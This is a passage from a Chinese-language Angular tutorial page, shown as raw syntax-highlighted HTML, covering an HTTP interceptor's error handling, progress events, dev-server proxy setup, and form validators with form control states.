            <span class="token keyword">this</span><span class="token punctuation">.</span>notification<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span>message<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
              nzKey<span class="token operator">:</span> <span class="token string">'exception'</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>body <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">1025</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 或者依然保持完整的格式</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>msg<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">参数为空。</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>body <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">503</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 或者依然保持完整的格式</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>msg<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>body <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">204</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 或者依然保持完整的格式</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>msg<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>body <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">201</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token punctuation">(</span>environment<span class="token punctuation">.</span><span class="token constant">SERVER_URL</span> <span class="token operator">+</span> <span class="token string">'res/knowledge-point/save'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
              <span class="token keyword">this</span><span class="token punctuation">.</span>msg<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token string">'自动保存修改成功'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
              <span class="token comment">// 或者依然保持完整的格式</span>
              <span class="token keyword">this</span><span class="token punctuation">.</span>msg<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">of</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">401</span><span class="token operator">:</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>notification<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">未登录或登录已过期，请重新登录。</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
          nzKey<span class="token operator">:</span> <span class="token string">'outTime'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// TODO 清空 token 信息</span>

        <span class="token comment">// this.goTo('/p/login',false);</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">403</span><span class="token operator">:</span>
      <span class="token keyword">case</span> <span class="token number">404</span><span class="token operator">:</span>
      <span class="token keyword">case</span> <span class="token number">500</span><span class="token operator">:</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>notification<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">请求出错，status：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ev<span class="token punctuation">.</span>status<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
          nzKey<span class="token operator">:</span> <span class="token string">'outTime'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// this.goTo(`/exception/${ev.status}`, false);</span>
        <span class="token function">throwError</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ev <span class="token keyword">instanceof</span> <span class="token class-name">HttpErrorResponse</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          console<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">'未可知错误，大部分是由于后端不支持CORS或无效配置引起'</span><span class="token punctuation">,</span> ev<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token function">throwError</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">of</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">intercept</span><span class="token punctuation">(</span>req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">,</span> next<span class="token operator">:</span> HttpHandler<span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>HttpEvent<span class="token operator">&lt;</span>any<span class="token operator">&gt;&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 统一加上服务端前缀</span>
    <span class="token keyword">let</span> url <span class="token operator">=</span> req<span class="token punctuation">.</span>url<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      url <span class="token operator">=</span> environment<span class="token punctuation">.</span><span class="token constant">SERVER_URL</span> <span class="token operator">+</span> url<span class="token punctuation">;</span>
      req <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> next<span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>
      <span class="token function">mergeMap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token comment">// 允许统一对请求错误处理</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>event <span class="token keyword">instanceof</span> <span class="token class-name">HttpResponseBase</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleData</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> req<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 若一切都正常，则后续操作</span>
        <span class="token keyword">return</span> <span class="token keyword">of</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">catchError</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token operator">:</span> HttpErrorResponse</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleData</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br></div></div><h3 id="http-进度事件"><a href="#http-进度事件" class="header-anchor">#</a> Http 进度事件</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">longRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpRequest</span><span class="token punctuation">(</span>
        <span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;/api/test-request&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
         <span class="token punctuation">{</span>reportProgress<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>
            <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>type <span class="token operator">===</span> HttpEventType<span class="token punctuation">.</span>DownloadProgress<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Download progress event&quot;</span><span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>type <span class="token operator">===</span> HttpEventType<span class="token punctuation">.</span>UploadProgress<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Upload progress event&quot;</span><span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>type <span class="token operator">===</span> HttpEventType<span class="token punctuation">.</span>Response<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;response received...&quot;</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="代理"><a href="#代理" class="header-anchor">#</a> 代理</h3> <p>这里演示一个简单的请求后端数据的服务</p> <p>步骤1：必须先在根模块中导入HttpClientModule模块，否则在其它地方无法正确引包</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>imports: [
    BrowserModule,
    // 导入HttpClientModule需要在BrowserModule模块的后面
    HttpClientModule,
],
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>步骤2：把 HttpClient 注入到应用类中</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>@Injectable({
  providedIn: 'root' // 《---
})
export class HttpService {
  constructor(
    private httpService:HttpClient
  ) { }
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>这一步之后还不能获得服务器数据，因为没有配置代理，会产生跨域的问题，因此要使用HttpClient的相关API请求数据，需要先配置好代理</p> <p>步骤3：配置代理</p> <p>在项目的 src/ 目录下创建一个 proxy.conf.json 文件，和 package.json 放在同一目录下</p> <p>往这个新的代理配置文件中添加如下内容：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>{
  &quot;/api&quot;: {
    &quot;target&quot;: &quot;http://localhost:3000&quot;,
    &quot;secure&quot;: false
  }
}

angular.json 中为 serve 目标添加 proxyConfig 选项：
&quot;architect&quot;: {
  &quot;serve&quot;: {
    &quot;builder&quot;: &quot;@angular-devkit/build-angular:dev-server&quot;,
    &quot;options&quot;: {
      &quot;browserTarget&quot;: &quot;AngularTest:build&quot;,
      &quot;proxyConfig&quot;: &quot;src/proxy.conf.json&quot;

    },
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>也可以在package.json的命令后面直接以参数的形式配置</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&quot;scripts&quot;: {
    &quot;ng&quot;: &quot;ng&quot;,

    &quot;start&quot;: &quot;ng serve --proxy-config proxy.config.json --port 4300&quot;,

    &quot;build&quot;: &quot;ng build&quot;,
    &quot;test&quot;: &quot;ng test&quot;,
    &quot;lint&quot;: &quot;ng lint&quot;,
    &quot;e2e&quot;: &quot;ng e2e&quot;
  },
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>经过以上配置之后就可以使用HttpClient相关的API了，比如get请求</p> <div class="language- line-numbers-mode"><pre class="language-text"><code> getServe():Observable&lt;any&gt;{
    return this.httpService.get(&quot;api/&quot;);
  }
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>HttpClient的很多API返回的都是Observable流。搭一个node服务器对请求进行了响应，返回了一个测试数据</p> <p><img src="/vuebloger/img/post/20190621210200251.jpg" alt=""></p> <h2 id="表单"><a href="#表单" class="header-anchor">#</a> 表单</h2> <p>Angular 中有两种表单：</p> <ul><li>Template Driven Forms - 模板驱动式表单 (类似于 AngularJS 1.x 中的表单 )</li> <li>Reactive Forms - 响应式表单</li></ul> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>若使用 template-driven 表单，则导入 FormsModule；若使用 reactive forms，则导入 ReactiveFormsModule。</p></div> <h3 id="所有内置验证器-validators"><a href="#所有内置验证器-validators" class="header-anchor">#</a> 所有内置验证器(validators)</h3> <ul><li>required - 设置表单控件值是非空的</li> <li>email - 设置表单控件值的格式是 email</li> <li>min - 设置表单控件值的最小值</li> <li>max - 设置表单控件值的最大值</li> <li>minlength - 设置表单控件值的最小长度</li> <li>maxlength - 设置表单控件值的最大长度</li> <li>pattern - 设置表单控件的值需匹配 pattern 对应的模式</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// novalidate 属性规定当提交表单时不对其进行验证</span>
<span class="token operator">&lt;</span>form novalidate<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> name<span class="token operator">=</span><span class="token string">&quot;name&quot;</span> ngModel required<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> name<span class="token operator">=</span><span class="token string">&quot;street&quot;</span> ngModel minlength<span class="token operator">=</span><span class="token string">&quot;3&quot;</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> name<span class="token operator">=</span><span class="token string">&quot;city&quot;</span> ngModel maxlength<span class="token operator">=</span><span class="token string">&quot;10&quot;</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> name<span class="token operator">=</span><span class="token string">&quot;zip&quot;</span> ngModel pattern<span class="token operator">=</span><span class="token string">&quot;[A-Za-z]{5}&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
<span class="token comment">//使用 FormControl 和 FormGroup API 创建表单：</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">Cmp</span> <span class="token punctuation">{</span>
  form<span class="token operator">:</span> FormGroup<span class="token punctuation">;</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>form <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormGroup</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      name<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span>required<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      street<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">minLength</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      city<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">maxLength</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      zip<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">pattern</span><span class="token punctuation">(</span><span class="token string">'[A-Za-z]{5}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">//也可以利用 FormBuilder 提供的 API，采用更便捷的方式创建表单：</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">Cmp</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> fb<span class="token operator">:</span> FormBuilder</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>form <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>fb<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      name<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span>required<span class="token punctuation">]</span><span class="token punctuation">,</span>
      street<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">minLength</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      city<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">maxLength</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      zip<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">pattern</span><span class="token punctuation">(</span><span class="token string">'[A-Za-z]{5}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><h3 id="所有表单控制的状态"><a href="#所有表单控制的状态" class="header-anchor">#</a> 所有表单控制的状态</h3> <ul><li>valid - 表单控件有效</li> <li>invalid - 表单控件无效</li> <li>pristine - 表单控件值未改变</li> <li>dirty - 表单控件值已改变</li> <li>touched - 表单控件已被访问过</li> <li>untouched - 表单控件未被访问过</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-root'</span><span class="token punctuation">,</span>
  styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   input.ng-invalid {
       border: 3px solid red;
    }
   input.ng-valid {
       border: 3px solid green;
    }
  </span><span class="token template-punctuation string">`</span></span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  &lt;form #loginForm=&quot;ngForm&quot; (ngSubmit)=&quot;onSubmit(loginForm.value)&quot;&gt;
   &lt;fieldset ngModelGroup=&quot;user&quot;&gt;
    &lt;input 
     type=&quot;text&quot; 
     required
     minlength=&quot;3&quot;
     name=&quot;username&quot;
     [(ngModel)]=&quot;username&quot;
     #userName=&quot;ngModel&quot;&gt;
